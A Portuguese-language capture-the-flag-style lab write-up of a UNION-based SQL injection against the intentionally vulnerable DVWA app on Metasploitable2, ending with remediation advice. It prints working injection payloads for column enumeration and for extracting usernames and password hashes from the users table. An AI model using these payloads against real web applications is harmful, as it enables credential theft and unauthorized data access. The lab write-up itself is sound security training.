# Writeup: SQL Injection (UNION-based) - DVWA - Metasploitable2

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: DVWA (Damn Vulnerable Web App) rodando em Metasploitable2
- URL: http://192.168.56.10/dvwa/
- Nível de segurança: Low

## 1. Identificação da vulnerabilidade
Campo "User ID" da aplicação aceita entrada sem sanitização.
Teste de quebra de sintaxe:

    Input: 1'
    Erro retornado: "You have an error in your SQL syntax..."

Confirma que a entrada é concatenada diretamente na consulta SQL
sem tratamento (parametrização ausente).

## 2. Enumeração da estrutura
Descoberta do número de colunas via ORDER BY:

    1' ORDER BY 2-- -   -> sem erro
    1' ORDER BY 3-- -   -> "Unknown column '3' in 'order clause'"

Conclusão: a consulta original utiliza 2 colunas.

## 3. Extração de informações via UNION SELECT
Informações do ambiente:

    1' UNION SELECT database(), version()-- -
    -> Banco: dvwa | Versão MySQL: 5.0.51a-3ubuntu5

Extração de credenciais da tabela users:

    1' UNION SELECT user, password FROM users-- -

Resultado: 5 contas extraídas com hashes MD5 (admin, gordonb,
1337, pablo, smithy) — a mesma tabela já identificada no writeup
de MySQL do Dia 1, porém extraída aqui via aplicação web pública,
sem necessidade de credencial de banco de dados.

## Conclusão
SQL Injection do tipo UNION-based permite extração completa de
dados sensíveis através de um formulário web comum, sem
credenciais administrativas. Como correção: usar consultas
parametrizadas (prepared statements) em vez de concatenação
direta de entrada do usuário, aplicar validação de tipo (o
campo espera um número inteiro), e nunca expor mensagens de erro
detalhadas de banco de dados para o usuário final.
